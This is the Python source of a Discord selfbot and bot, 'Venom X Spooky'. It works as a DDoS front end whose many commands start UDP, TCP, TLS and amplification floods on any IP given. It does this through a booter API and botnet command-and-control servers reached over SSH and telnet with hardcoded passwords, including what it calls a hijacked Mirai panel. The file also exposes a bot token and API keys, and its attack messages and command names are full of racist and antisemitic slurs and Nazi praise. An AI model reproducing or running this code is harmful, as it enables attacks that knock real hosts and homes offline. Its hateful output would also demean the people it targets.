import discord, os, colorama, time, sys, json, asyncio, io, string, linecache
import requests, random, aiohttp, re, platform, paramiko, subprocess, datetime
from colorama import Fore
from requests import get
from discord import Webhook
from dhooks import Webhook, Embed, File
from discord import Permissions
from discord.ext import commands
from urllib.request import urlopen
from getpass import getpass
import telnetlib



spookyids = '1056492978488754227'

intents = discord.Intents.all()
intents.members = True
# imports etc
version = 2.8
if not os.path.isfile("./config/config.json"):
	sys.exit("'/config/config.json' not found! Please add it and try again.")
else:
	with open("./config/config.json") as file:
		config = json.load(file)
token = config.get('token')
sprefix = ","
whitelistedrole = "SpookyTop"
password = config.get('password')
prefix = config.get('prefix')
apikey = config.get('key')
apuser = config.get('apiusername')
Venom = commands.Bot(command_prefix=prefix, self_bot=True, case_sensitive=False, intents=intents)
Spooky = commands.Bot(command_prefix=sprefix, self_bot=False, case_sensitive=False, intents=intents)
id21 = 1081685398109028352

host = "51.68.193.186"
conport = "1337"
cncusr = "Izumi"
cncpass = "ishot"
loop = asyncio.get_event_loop()
# main
class main:
	Spooky.remove_command('help')
	print("loading packages please wait...")
	time.sleep(4)
	os.system("clear")
	colorama.init()
ART = f"""  
VENOM X SPOOKY {Fore.LIGHTMAGENTA_EX}V1.2 Feel The Darkness
"""
print(Fore.LIGHTCYAN_EX + ART)


@Venom.event
async def on_ready():
	guilds = len(Venom.guilds)
	id = Venom.user.id
	ping = Venom.latency
	ping = str(round(ping, 2))
	cmds = len(Venom.commands)
	f = len(Venom.user.friends)
	await Venom.change_presence(activity=discord.Game(name='Venom Control Room'))
	stat = True
	if stat == True:
		print(Fore.LIGHTCYAN_EX + ("-------------STATS---------------------"))
		print("Logged in as " + Venom.user.display_name + " UID: " + str(id))
		print("Ping " + str(ping) + "ms")
		print("Prefix is " + prefix)
		print("Command Count: " + str(cmds))
		print("Guild Count: " + str(guilds) + " | Friend Count: " + str(f))





@Venom.command(brief="ip lookup tool")
async def ip(ctx, *, ipaddr: str = '9.9.9.9'):
	try:
		r = requests.get(f"http://extreme-ip-lookup.com/json/{ipaddr}?key=n2jrsS7rgJC6T28b4zww")
		geo = r.json()
		vpn = requests.get(f"http://ip-api.com/json/{ipaddr}?fields=proxy")
		proxy = vpn.json()
		fields = [
			{'name': 'Proxy Status', 'value': proxy['proxy']},
			{'name': 'IP', 'value': geo['query']},
			{'name': 'IP Type', 'value': geo['ipType']},
			{'name': 'Country', 'value': geo['country']},
			{'name': 'City', 'value': geo['city']},
			{'name': 'continent', 'value': geo['continent']},
			{'name': 'Hostname', 'value': geo['ipName']},
			{'name': 'ISP', 'value': geo['isp']},
			{'name': 'Business', 'value': geo['businessWebsite']},
			{'name': 'Website', 'value': geo['businessName']},
		]
		for field in fields:
			if field['value']:
				await ctx.send(f"```{field['name']} \n {field['value']}```")
	except:
		pass


@Venom.command(brief="host port time method")
async def null(ctx, arg1, arg2, arg3, arg4):
	try:
		await ctx.message.delete()
		import os
		import webbrowser
		print(Fore.LIGHTMAGENTA_EX + ("Tsuki Attack Sent"))
		print(f"[Venom] Host {arg1}\n [Venom] Port {arg2}\n [Venom] Time {arg3}\n [Venom] Method {arg4}")
		await ctx.send(f"_**Request Sent!**_\n **Host** \n```{arg1}``` \n **Port** \n```{arg2}``` **Time** \n```{arg3}``` \n **Method** \n```{arg4}```")
		try:
			await get(f'https://ctxsend.com/Endpoints/apistart.php?key={apikey}&host={arg1}&port={arg2}&time={arg3}&method={arg4}&username={apuser}')
		except:
			pass
	except:
		pass

@Venom.command(brief="big udp flood")
async def tsunami(ctx, ip, port, time):
	try:
		await ctx.message.delete()
		get(f'https://ctxsend.com/Endpoints/apistart.php?key={apikey}&host={ip}&port={port}&time={time}&method=UDP-KILL&username={apuser}')
		await asyncio.sleep(3)
		get(f'https://ctxsend.com/Endpoints/apistart.php?key={apikey}&host={ip}&port={port}&time={time}&method=UDP-RAW&username={apuser}')
	except:
		pass
	ssh = paramiko.SSHClient()
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	ssh.connect(hostname=host, port=conport, username=cncusr, password=cncpass)
	channel = ssh.invoke_shell()
	channel.send(f'UDPRAW {ip} {port} {time}')
	channel.send('\u000d')
	channel.send('exit')
	channel.send('\u000d')
	ssh.close()
	await ctx.send(f"**_RUNNNNN!_**\n\n **Target:**```{ip}```\n **Port:**```{port}```\n **Time:**```{time}```\n **A Tsunami is Coming!!!**")

@Venom.command(brief="alternative to tsunami")
async def surge(ctx, ip, port, time):
	try:
		await ctx.message.delete()
		get(f'https://ctxsend.com/Endpoints/apistart.php?key={apikey}&host={ip}&port={port}&time={time}&method=UDP-KILL&username={apuser}')
		await asyncio.sleep(3)
		get(f'https://ctxsend.com/Endpoints/apistart.php?key={apikey}&host={ip}&port={port}&time={time}&method=UDP-RAW&username={apuser}')
	except:
		pass
	ssh = paramiko.SSHClient()
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	ssh.connect(hostname=host, port=conport, username=cncusr, password=cncpass)
	channel = ssh.invoke_shell()
	channel.send(f'UDP {ip} {port} {time}')
	channel.send('\u000d')
	channel.send('exit')
	channel.send('\u000d')
	ssh.close()
	await ctx.send(f"**The City its Flooding!**\n\n **Target:**```{ip}```\n **Port:**```{port}```\n **Time:**```{time}```\n **The Surge Broke the barrier!!!**")


@Venom.command(brief="Big tcp flood")
async def apocalypse(ctx, ip, port, time):
	try:
		await ctx.message.delete()
		get(f'https://ctxsend.com/Endpoints/apistart.php?key={apikey}&host={ip}&port={port}&time={time}&method=TCP-BYPASS&username={apuser}')
		await asyncio.sleep(3)
		get(f'https://ctxsend.com/Endpoints/apistart.php?key={apikey}&host={ip}&port={port}&time={time}&method=TCP-BYPASS&username={apuser}')
	except:
		pass
	ssh = paramiko.SSHClient()
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	ssh.connect(hostname=host, port=conport, username=cncusr, password=cncpass)
	channel = ssh.invoke_shell()
	channel.send(f'TCP {ip} {port} {time}')
	channel.send('\u000d')
	channel.send('exit')
	channel.send('\u000d')
	ssh.close()
	await ctx.send(f"**The End Times Are Here**\n\n **Target:**```{ip}```\n **Port:**```{port}```\n **Time:**```{time}```\n **Its the Apocalypse**")

@Venom.command(brief="alternative to apocalypse")
async def hell(ctx, ip, port, time):
	try:
		await ctx.message.delete()
		get(f'https://ctxsend.com/Endpoints/apistart.php?key={apikey}&host={ip}&port={port}&time={time}&method=TCP-BYPASS&username={apuser}')
		await asyncio.sleep(3)
		get(f'https://ctxsend.com/Endpoints/apistart.php?key={apikey}&host={ip}&port={port}&time={time}&method=TCP-SOCKET&username={apuser}')
	except:
		pass
	ssh = paramiko.SSHClient()
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	ssh.connect(hostname=host, port=conport, username=cncusr, password=cncpass)
	channel = ssh.invoke_shell()
	channel.send(f'ACK {ip} {port} {time}')
	channel.send('\u000d')
	channel.send('exit')
	channel.send('\u000d')
	ssh.close()
	await ctx.send(f"**So You Wanna Meet Satan**\n\n **Target:**```{ip}```\n **Port:**```{port}```\n **Time:**```{time}```\n **I guess im going to have to send you straight to hell**")


@Venom.command(brief="alternative to blitz")
async def auschwitz(ctx, ip, port, time):
	try:
		await ctx.message.delete()
		get(f'https://ctxsend.com/Endpoints/apistart.php?key={apikey}&host={ip}&port={port}&time={time}&method=UDP-KILL&username={apuser}')
		await asyncio.sleep(3)
		get(f'https://ctxsend.com/Endpoints/apistart.php?key={apikey}&host={ip}&port={port}&time={time}&method=PPS-FLOOD&username={apuser}')
	except:
		pass
	ssh = paramiko.SSHClient()
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	ssh.connect(hostname=host, port=conport, username=cncusr, password=cncpass)
	channel = ssh.invoke_shell()
	channel.send(f'GAME {ip} {port} {time}')
	channel.send('\u000d')
	channel.send('exit')
	channel.send('\u000d')
	ssh.close()
	await ctx.send(f"**Lets take a Little Trip**\n\n **Target:**```{ip}```\n **Port:**```{port}```\n **Time:**```{time}```\n **To Auschwitz My Little Jew**")

@Venom.command(brief="high pps flood")
async def blitz(ctx, ip, port, time):
	try:
		await ctx.message.delete()
		get(f'https://ctxsend.com/Endpoints/apistart.php?key={apikey}&host={ip}&port={port}&time={time}&method=UDP-KILL&username={apuser}')
		await asyncio.sleep(3)
		get(f'https://ctxsend.com/Endpoints/apistart.php?key={apikey}&host={ip}&port={port}&time={time}&method=UDP-RAW&username={apuser}')
	except:
		pass
	ssh = paramiko.SSHClient()
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	ssh.connect(hostname=host, port=conport, username=cncusr, password=cncpass)
	channel = ssh.invoke_shell()
	channel.send(f'PPS {ip} {port} {time}')
	channel.send('\u000d')
	channel.send('exit')
	channel.send('\u000d')
	ssh.close()
	await ctx.send(f"**Better Run Jew**\n\n **Target:**```{ip}```\n **Port:**```{port}```\n **Time:**```{time}```\n **Heil Hitler**")


@Venom.command(brief="ovh killer")
async def wildfire(ctx, ip, port, time):
	try:
		await ctx.message.delete()
		get(f'https://ctxsend.com/Endpoints/apistart.php?key={apikey}&host={ip}&port={port}&time={time}&method=OVH-TCP&username={apuser}')
		await asyncio.sleep(3)
		get(f'https://ctxsend.com/Endpoints/apistart.php?key={apikey}&host={ip}&port={port}&time={time}&method=HANDSHAKE&username={apuser}')
	except:
		pass
	ssh = paramiko.SSHClient()
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	ssh.connect(hostname=host, port=conport, username=cncusr, password=cncpass)
	channel = ssh.invoke_shell()
	channel.send(f'OVHTCP {ip} {port} {time}')
	channel.send('\u000d')
	channel.send('exit')
	channel.send('\u000d')
	ssh.close()
	await ctx.send(f"**Damn its Hot around here**\n\n **Target:**```{ip}```\n **Port:**```{port}```\n **Time:**```{time}```\n **WildFire**")

@Venom.command(brief="big socket flood")
async def hurricane(ctx, ip, port, time):
	try:
		await ctx.message.delete()
		get(f'https://ctxsend.com/Endpoints/apistart.php?key={apikey}&host={ip}&port={port}&time={time}&method=TCP-SOCKET&username={apuser}')
		await asyncio.sleep(3)
		get(f'https://ctxsend.com/Endpoints/apistart.php?key={apikey}&host={ip}&port={port}&time={time}&method=TCP-SOCKET&username={apuser}')
	except:
		pass
	ssh = paramiko.SSHClient()
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	ssh.connect(hostname=host, port=conport, username=cncusr, password=cncpass)
	channel = ssh.invoke_shell()
	channel.send(f'TRUCK {ip} {port} {time}')
	channel.send('\u000d')
	channel.send('exit')
	channel.send('\u000d')
	ssh.close()
	await ctx.send(f"**LMAO what are we gonna name this one**\n\n **Target:**```{ip}```\n **Port:**```{port}```\n **Time:**```{time}```\n **Hurricane**")


@Venom.command(brief="tls flood")
async def typhoon(ctx, ip, port, time):
	try:
		await ctx.message.delete()
		get(f'https://ctxsend.com/Endpoints/apistart.php?key={apikey}&host={ip}&port={port}&time={time}&method=HTTPS-TLS&username={apuser}')
		await asyncio.sleep(2)
		get(f'https://ctxsend.com/Endpoints/apistart.php?key={apikey}&host={ip}&port={port}&time={time}&method=HTTPS-TLS&username={apuser}')
		await asyncio.sleep(2)
		get(f'https://ctxsend.com/Endpoints/apistart.php?key={apikey}&host={ip}&port={port}&time={time}&method=HTTP-RAW&username={apuser}')
	except:
		pass
	ssh = paramiko.SSHClient()
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	ssh.connect(hostname=host, port=conport, username=cncusr, password=cncpass)
	channel = ssh.invoke_shell()
	channel.send(f'TLS {ip} {port} {time}')
	channel.send('\u000d')
	channel.send('exit')
	channel.send('\u000d')
	ssh.close()
	await ctx.send(f"**Damn im getting wet**\n\n **Target:**```{ip}```\n **Port:**```{port}```\n **Time:**```{time}```\n **Typhoon**")



@Venom.command(brief="browser")
async def raid(ctx, ip, port, time):
	try:
		await ctx.message.delete()
		get(f'https://ctxsend.com/Endpoints/apistart.php?key={apikey}&host={ip}&port={port}&time={time}&method=BROWSER&username={apuser}')
		await asyncio.sleep(3)
		get(f'https://ctxsend.com/Endpoints/apistart.php?key={apikey}&host={ip}&port={port}&time={time}&method=BROWSER&username={apuser}')
	except:
		pass
	ssh = paramiko.SSHClient()
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	ssh.connect(hostname=host, port=conport, username=cncusr, password=cncpass)
	channel = ssh.invoke_shell()
	channel.send(f'BROWSER {ip} {port} {time}')
	channel.send('\u000d')
	channel.send('exit')
	channel.send('\u000d')
	ssh.close()
	await ctx.send(f"**Tango Down**\n\n **Target:**```{ip}```\n **Port:**```{port}```\n **Time:**```{time}```\n **Raid**")

@Venom.command(brief="handshake flood")
async def friend(ctx, ip, port, time):
	try:
		await ctx.message.delete()
		get(f'https://ctxsend.com/Endpoints/apistart.php?key={apikey}&host={ip}&port={port}&time={time}&method=HANDSHAKE&username={apuser}')
		await asyncio.sleep(3)
		get(f'https://ctxsend.com/Endpoints/apistart.php?key={apikey}&host={ip}&port={port}&time={time}&method=HANDSHAKE&username={apuser}')
	except:
		pass
	ssh = paramiko.SSHClient()
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	ssh.connect(hostname=host, port=conport, username=cncusr, password=cncpass)
	channel = ssh.invoke_shell()
	channel.send(f'SYN {ip} {port} {time}')
	channel.send('\u000d')
	channel.send('exit')
	channel.send('\u000d')
	ssh.close()
	await ctx.send(f"**Wanna be my...**\n\n **Target:**```{ip}```\n **Port:**```{port}```\n **Time:**```{time}```\n **Friend**")

@Venom.command(brief="amp it up")
async def superamp(ctx, ip, port, time):
	try:
		await ctx.message.delete()
		get(f'https://ctxsend.com/Endpoints/apistart.php?key={apikey}&host={ip}&port={port}&time={time}&method=UDP-KILL&username={apuser}')
		await asyncio.sleep(3)
		get(f'https://ctxsend.com/Endpoints/apistart.php?key={apikey}&host={ip}&port={port}&time={time}&method=DNS&username={apuser}')
	except:
		pass
	ssh = paramiko.SSHClient()
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	ssh.connect(hostname=host, port=conport, username=cncusr, password=cncpass)
	channel = ssh.invoke_shell()
	channel.send(f'DNS {ip} {port} {time}')
	channel.send('\u000d')
	channel.send('exit')
	channel.send('\u000d')
	ssh.close()
	await ctx.send(f"**Crank up the**\n\n **Target:**```{ip}```\n **Port:**```{port}```\n **Time:**```{time}```\n **Amps lets fry this nigger**")


@Venom.command(brief="ip port time method")
async def kod(ctx, ip, port, time, method):
	await ctx.message.delete()
	ssh = paramiko.SSHClient()
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	ssh.connect(hostname=host, port=conport, username=cncusr, password=cncpass)
	channel = ssh.invoke_shell()
	channel.send(f'{method} {ip} {port} {time}')
	channel.send('\u000d')
	channel.send('exit')
	channel.send('\u000d')
	ssh.close()
	print(Fore.LIGHTMAGENTA_EX + ("Kiss Of Death Sent To"))
	print(f"[Venom] Host {ip}\n [Venom] Port {port}\n [Venom] Time {time}\n [Venom] Method {method}")
	await ctx.send(f"**_Kiss Of Death Sent!_**\n\n **Target:**```{ip}```\n **Port:**```{port}```\n **Time:**```{time}```\n **Method:**```{method} ```")


@Venom.command(name='restart')
async def restart(ctx):
	await ctx.send("Restarting Venom...")
	os.execv(sys.executable, ['python3'] + sys.argv)
	await ctx.send("restarted?")

@Venom.command(brief="Lists Tsuki API Methods")
async def meth(ctx):
	await ctx.message.delete()
	await ctx.send(f"**Layer 4**\n **UDP METHODS** \n``` UDP-RAW \n DNS \n NTP \n PPS-FLOOD \n UDP-KILL \n RAKNET \n FIVEM ```\n **TCP METHODS** \n``` HANDSHAKE \n TCP-SOCKET \n TCP-BYPASS \n OVH-TCP \n NFO-TCP  ```")
	await ctx.send(f"**Layer 7**\n ``` HTTP-RAW \n HTTPS-TLS \n BROWSER ```")
	await ctx.send(f"**Attack Args**\n ``` {prefix}null host port time method```")


@Venom.command(brief="Lists KOD API Methods")
async def kiss(ctx):
	await ctx.message.delete()
	await ctx.send(f"**AMPS**\n```DNS \n NTP \n DVR \n LDAP \n MIXAMP \n HOMEV1 \n HOMEV2```")
	await ctx.send(f"**L4**\n *UDP METHODS* \n``` UDP \n OVHUDP ```\n *TCP METHODS* \n``` TCP \n SOCKET \n SSH \n OVHTCP \n NFO ```")
	await ctx.send(f"**GAME**\n```GAME \n FIVEM \n R6-NULL \n GAMEMIX \n GAMEAMP \n MC-DROP \n WZ4 \n WZ-KILL```")
	await ctx.send(f"**RAW**\n```VSE \n UDPRAW \n PPS \n SYN \n ACK```")
	await ctx.send(f"**L7**\n```TLS \n BROWSER \n CFPRO \n UAM \n HTTPS```")
	await ctx.send(f"**ARGS**\n```{prefix}kod host port time method```")

#Spooky bot section

@Spooky.event
async def on_ready():
	ping = Spooky.latency
	ping = str(round(ping, 2))
	await Spooky.change_presence(activity=discord.Game(name='Spooky | The Darkness is Coming'))
	stat = True
	if stat == True:
		scmd = len(Spooky.commands)
		channel = Spooky.get_channel(id21)
		main = discord.Embed(color=discord.colour.Colour.red())
		main.add_field(name="Logged in As", value=f"{Spooky.user.display_name}#{Spooky.user.discriminator}", inline=False)
		main.add_field(name="Ping", value=str(ping) + "ms", inline=False)
		main.add_field(name="Prefix", value=f"Prefix is {sprefix}", inline=False)
		main.add_field(name="Command Count", value= str(scmd), inline=False)
		main.set_thumbnail(url="https://c.tenor.com/Z5lIBiOdagsAAAAC/purple-aesthetic-rain.gif")
		main.timestamp = datetime.datetime.utcnow()
		imageURL = "https://c.tenor.com/Z5lIBiOdagsAAAAC/purple-aesthetic-rain.gif"
		main.set_image(url=imageURL)
		main.set_footer(text=f"Spooky Is Now Online ")
		await channel.send(embed=main)

@Spooky.command(name="lazy", brief="lazy how to kill all faggots")
async def lmgtfy(ctx, *, search):
	await ctx.message.delete()
	await ctx.send(f"https://lmgtfy.app/?q={search.replace(' ', '+')}")

loop.create_task(Venom.start(token, bot=False))
loop.create_task(Spooky.start("MTA3MTY0NTAwMjUxNTYyMzkzNw.GoCpJv.0ieeml_sfJyon6R8zuTufG2ErSEq3LKuXoUAGw", bot=True))

@Spooky.command(pass_context=True)
async def help(ctx):
	await ctx.message.delete()
	imageURL = "https://c.tenor.com/Z5lIBiOdagsAAAAC/purple-aesthetic-rain.gif"
	embed = discord.Embed(title="Spooky | Help", color=discord.Colour.blue())
	embed.set_author(name='Help-Menu')
	embed.add_field(name='Commands', value=',methods ,help ,api ,rules ,nuke ,tools ,hyuriko', inline=True)
	embed.add_field(name='Attack Args', value=',method ip port time', inline=True)
	embed.add_field(name='Change-Logs', value='type ,changelog to see the new additions to Spooky X Venom', inline=True)
	embed.set_image(url=imageURL)
	embed.timestamp = datetime.datetime.utcnow()
	embed.set_footer(text="Spooky V1.8")
	await ctx.send(embed=embed)

@Spooky.command()
async def tools(ctx):
	await ctx.message.delete()
	tools = discord.Embed(title="Spooky | Tools", color=discord.Colour.blue())
	tools.add_field(name="lookup", value="Shows The Details Of The IP", inline=False)
	tools.add_field(name="lazy", value=f"{sprefix}lazy how to kill a jew", inline=False)
	tools.set_image(url="https://c.tenor.com/Z5lIBiOdagsAAAAC/purple-aesthetic-rain.gif")
	tools.timestamp = datetime.datetime.utcnow()
	tools.set_footer(text="Spooky V1.8")
	await ctx.send(embed=tools)

@Spooky.command()
async def changelog(ctx):
	await ctx.message.delete()
	logs = discord.Embed(title="Spooky | Changelog", color=discord.Colour.blue())
	logs.add_field(name="Improvements", value="Surge gbps increased, tsunami pps increased, auschwitz improved gbps and pps", inline=False)
	logs.add_field(name="Extras", value="added tools command and changed prefix to a comma", inline=False)
	logs.add_field(name="Removed", value="hell was kinda useless as anubis is better", inline=False)
	logs.add_field(name="New", value="anubis is a tcp method that has high pps, home is a amp made to hit homes obv, riot using new raw api ", inline=False)
	logs.set_image(url="https://c.tenor.com/Z5lIBiOdagsAAAAC/purple-aesthetic-rain.gif")
	logs.timestamp = datetime.datetime.utcnow()
	logs.set_footer(text="Spooky V1.8")
	await ctx.send(embed=logs)


@Spooky.command()
async def lookup(ctx, *, ipaddr: str = '9.9.9.9'):
	await ctx.message.delete()
	r = requests.get(f"http://extreme-ip-lookup.com/json/{ipaddr}?key=n2jrsS7rgJC6T28b4zww")
	geo = r.json()
	vpn = requests.get(f"http://ip-api.com/json/{ipaddr}?fields=proxy")
	proxy = vpn.json()
	em = discord.Embed(title='???? ???????????? ??????????????', color=discord.Colour.dark_teal())
	fields = [
		{'name': 'IP', 'value': geo['query']},
		{'name': 'IP Type', 'value': geo['ipType']},
		{'name': 'Proxy Status', 'value': proxy['proxy']},
		{'name': 'Country', 'value': geo['country']},
		{'name': 'City', 'value': geo['city']},
		{'name': 'continent', 'value': geo['continent']},
		{'name': 'Hostname', 'value': geo['ipName']},
		{'name': 'ISP', 'value': geo['isp']},
		{'name': 'Latitude', 'value': geo['lat']},
		{'name': 'Longitude', 'value': geo['lon']},
		{'name': 'ORG', 'value': geo['org']},
		{'name': 'Region', 'value': geo['region']},
		{'name': 'Business', 'value': geo['businessWebsite']},
		{'name': 'Website', 'value': geo['businessName']},
		{'name': 'Status', 'value': geo['status']},
	]
	for field in fields:
		if field['value']:
			author = ctx.message.author
			imageURL = "https://c.tenor.com/Z5lIBiOdagsAAAAC/purple-aesthetic-rain.gif"
			em.set_image(url=imageURL)
			em.timestamp = datetime.datetime.utcnow()
			em.add_field(name=field['name'], value=field['value'], inline=True)
	return await ctx.send(author, embed=em)

@Spooky.command()
async def rules(ctx):
	await ctx.message.delete()
	rules = discord.Embed(title="Spooky | Rules",color=discord.Colour.green())
	rules.set_author(name='Rules')
	rules.add_field(name="Hitting Government Websites Or Anything That Has To Do With The Government", value="You Will Be Banned With No Warning", inline=False)
	rules.add_field(name="Spamming Attacks", value="It Will Result In A Ban Or Removal From The Bot", inline=False)
	rules.add_field(name="Hitting Edu Websites", value="It Will Result In A Ban Or Removal From The Bot", inline=False)
	rules.add_field(name="Hitting Dstats For More Than 1min", value="It Will Result In A Ban Or Removal From The Bot", inline=False)
	rules.set_image(url="https://c.tenor.com/Z5lIBiOdagsAAAAC/purple-aesthetic-rain.gif")
	rules.timestamp = datetime.datetime.utcnow()
	rules.set_footer(text="Spooky V1.8")
	await ctx.send(embed=rules)

@Spooky.command()
async def nuke(ctx):
	id = str(ctx.author.id)
	if id == spookyids:
	    await ctx.channel.purge(limit=8000)
	nuke = discord.Embed(title="This Channel Has Been Nuked", color=0x000000)
	nuke.set_image(url="https://bestanimations.com/Military/Explosions/explosion-animated-gif-39.gif")
	nuke.set_footer(text="Spooky V1.8")
	await ctx.send(embed=nuke)


@Spooky.command(pass_context=True)
async def methods(ctx):
	await ctx.message.delete()
	imageURL = "https://c.tenor.com/Z5lIBiOdagsAAAAC/purple-aesthetic-rain.gif"
	embed = discord.Embed(title="Spooky | Methods", color=discord.Colour.red())
	embed.set_author(name='Methods-List')
	embed.add_field(name=',apocalypse', value='high gbps tcp flood', inline=False)
	embed.add_field(name=',anubis', value='apocalypse alternative with more pps', inline=False)
	embed.add_field(name=',blitz', value='big pps flood', inline=False)
	embed.add_field(name=',auschwitz', value='game flood alt for blitz', inline=False)
	embed.add_field(name=',friend', value='syn-ack handshake flood ', inline=False)
	embed.add_field(name=',hurricane', value='socket flood', inline=False)
	embed.add_field(name=',wildfire', value='tcp ovh bypass flood', inline=False)
	embed.add_field(name=',superamp', value='big amp flood', inline=False)
	embed.add_field(name=',home', value='home flood', inline=False)
	embed.add_field(name=',surge', value='raw high gbps', inline=False)
	embed.add_field(name=',riot', value='surge but better', inline=False)
	embed.add_field(name=',tsunami', value='amp udp flood high gbps', inline=False)
	embed.add_field(name=',typhoon', value='l7 tls flood', inline=False)
	embed.add_field(name=',raid', value='l7 browser emulation flood', inline=False)
	embed.add_field(name=',api', value='Shows the connected apis ', inline=False)
	embed.set_footer(text="Spooky V1.8")
	embed.set_image(url=imageURL)
	embed.timestamp = datetime.datetime.utcnow()
	await ctx.send(embed=embed)

@Spooky.command(pass_context=True)
async def api(ctx):
	await ctx.message.delete()
	imageURL = "https://c.tenor.com/Z5lIBiOdagsAAAAC/purple-aesthetic-rain.gif"
	embed = discord.Embed(title="Spooky | Apis", color=discord.Colour.magenta())
	embed.set_author(name='Api-List')
	embed.add_field(name='Venom', value='Spoofed L4', inline=False)
	embed.add_field(name='Tsuki', value='Big L7', inline=False)
	embed.add_field(name='Yuriko', value='Big L7', inline=False)
	embed.add_field(name='Spooky Raw', value='Raw L4', inline=False)
	embed.set_footer(text="Spooky V1.8")
	embed.set_image(url=imageURL)
	embed.timestamp = datetime.datetime.utcnow()
	await ctx.send(embed=embed)

#spooky methods
@Spooky.command(brief="big udp flood")
@commands.has_role(whitelistedrole)
async def tsunami(ctx, ip, port, time):
	try:
		await ctx.message.delete()
		get(f'https://ctxsend.com/Endpoints/apistart.php?key={apikey}&host={ip}&port={port}&time={time}&method=UDP-KILL&username={apuser}')
		await asyncio.sleep(3)
		get(f'https://ctxsend.com/Endpoints/apistart.php?key={apikey}&host={ip}&port={port}&time={time}&method=UDP-RAW&username={apuser}')
	except:
		pass
	ssh = paramiko.SSHClient()
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	ssh.connect(hostname=host, port=conport, username=cncusr, password=cncpass)
	channel = ssh.invoke_shell()
	channel.send(f'UDP {ip} {port} {time}')
	channel.send('\u000d')
	channel.send('exit')
	channel.send('\u000d')
	ssh.close()
	imageURL = "https://bestanimations.com/Military/Explosions/explosion-animated-gif-39.gif"
	author = ctx.message.author
	attack = discord.Embed(title="Spooky | Tsunami", color=discord.Colour.gold())
	attack.set_author(name=author)
	attack.add_field(name='RUNNN', value='', inline=False)
	attack.add_field(name='Target', value=f'{ip}', inline=False)
	attack.add_field(name='Port', value=f'{port}', inline=False)
	attack.add_field(name='Duration', value=f'{time}', inline=False)
	attack.add_field(name='A Tsunami is Coming!!!', value=f'', inline=False)
	attack.set_footer(text="Spooky V1.8")
	attack.set_image(url=imageURL)
	attack.timestamp = datetime.datetime.utcnow()
	await ctx.send(embed=attack)

@Venom.command(brief="komorebi bot count")
async def komo(ctx):
	await ctx.message.delete()
	with telnetlib.Telnet('85.31.45.232', 421) as tn:
		tn.write(b"yuno\n")
		await asyncio.sleep(2)
		tn.write(b"yunnotop\n")
		await asyncio.sleep(2)
		tn.write(b"botcount\n")
		time.sleep(5)
		await asyncio.sleep(3)
		tn.write(b"exit\n")
		FML = tn.read_very_eager()
		file = open("bots.txt", "w")
		file.write(f"SPOOKY:\nVENOM\n:\n{FML} ")
		file.close()
		print("FML SAVED")
		await ctx.send("FML SAVED")
		string = open('bots.txt').read()
		new_str = re.sub('[^a-zA-Z0-9\n\.]', ' ', string)
		open('b.txt', 'w').write(new_str)
		time.sleep(3)
		tn.close()
		await ctx.send("filter active")
		with open("b.txt", "r") as f:
			text = f.read()
			matches = re.findall(r"\d{4} Bots  ", text)
			save = str(matches).replace("Bots  ", "")
			open('Final.txt', 'w').write(save)
			file2 = open("Final.txt", "r")
			# initializing list
			count = file2
			nigger = list(count)
			print(nigger)
			firstElement = nigger[0]
			await ctx.send("**The Bot Count Is **" + firstElement)


@Venom.command(brief="home holder")
async def hold(ctx, ip, port, time):
	await ctx.message.delete()
	with telnetlib.Telnet('192.54.57.220', 5555) as tn:
		tn.write(b"admin\n")
		await asyncio.sleep(2)
		tn.write(b"jjwoaini1314\n")
		await asyncio.sleep(2)
		command = (f"udp {ip} {time} dport={port}".encode('ascii'))
		tn.write(command + b"\n")
		await asyncio.sleep(3)
		tn.write(b"exit\n")
		tn.close()
		await ctx.send(f"**Home Holder**\n\n **Target:**```{ip}```\n **Port:**```{port}```\n **Time:**```{time}```\n **HOLD THAT NIGGER DOWNN!!**")

@Spooky.command(brief="home holder")
async def hold(ctx, ip, port, time):
	await ctx.message.delete()
	with telnetlib.Telnet('192.54.57.220', 5555) as tn:
		tn.write(b"admin\n")
		await asyncio.sleep(2)
		tn.write(b"jjwoaini1314\n")
		await asyncio.sleep(2)
		command = (f"udp {ip} {time} dport={port}".encode('ascii'))
		tn.write(command + b"\n")
		await asyncio.sleep(3)
		tn.write(b"exit\n")
		tn.close()
		imageURL = "https://bestanimations.com/Military/Explosions/explosion-animated-gif-39.gif"
		raw = discord.Embed(title="Spooky | Home-Holder", color=discord.Colour.teal())
		raw.add_field(name='Lmao Hijacked Mirai', value='', inline=False)
		raw.add_field(name='Target', value=f'{ip}', inline=False)
		raw.add_field(name='Port', value=f'{port}', inline=False)
		raw.add_field(name='Duration', value=f'{time}', inline=False)
		raw.add_field(name='Method', value=f'Hold', inline=False)
		raw.add_field(name='Hold That Nigger DOWNNN!!!', value=f'', inline=False)
		raw.set_footer(text="Spooky V1.8")
		raw.set_image(url=imageURL)
		raw.timestamp = datetime.datetime.utcnow()
		await ctx.send(embed=raw)

@Spooky.command(brief="home holder")
async def test(ctx, ip, port, time):
	await ctx.message.delete()
	with telnetlib.Telnet('192.54.57.220', 5555) as tn:
		asyncio.sleep(5)
		tn.read_until("Username:")
		tn.write(b"admin\r\n")
		await asyncio.sleep(5)
		tn.read_until("Password:")
		tn.write(b"jjwoaini1314\r\n")
		balls = tn.read_very_eager()
		file = open("logsearly.txt", "w")
		print("reading successful")
		file.write(f"SPOOKY:\nVENOM\n:\n{balls} ")
		file.close()
		await asyncio.sleep(3)
		command = (f"udp {ip} {time} dport={port}".encode('ascii'))
		tn.write(command + b"\r\n")
		await asyncio.sleep(4)
		rip = tn.read_very_eager()
		file = open("logs.txt", "w")
		print(rip)
		file.write(f"SPOOKY:\nVENOM\n:\n{rip} ")
		file.close()
		tn.write(b"exit\n")
		tn.close()
		await ctx.send("Sent?")



@Venom.command(brief="komorebi bot count if under 1k")
async def rebi(ctx):
	await ctx.message.delete()
